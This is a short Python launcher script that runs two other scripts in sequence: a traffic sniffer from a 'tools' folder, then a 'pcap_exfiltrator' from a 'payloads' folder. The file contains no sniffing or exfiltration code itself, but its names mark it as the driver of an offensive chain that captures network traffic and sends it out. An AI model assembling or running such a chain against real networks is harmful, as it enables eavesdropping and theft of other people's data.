import subprocess
import os

def main():
    # Run the traffic sniffer
    traffic_sniffer_path = os.path.join(os.path.dirname(__file__), "tools", "traffic_sniffer.py")
    subprocess.run(["python3", traffic_sniffer_path])

    # Run the pcap exfiltrator
    pcap_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "pcap_exfiltrator.py")
    subprocess.run(["python3", pcap_exfiltrator_path])

if __name__ == "__main__":
    main()
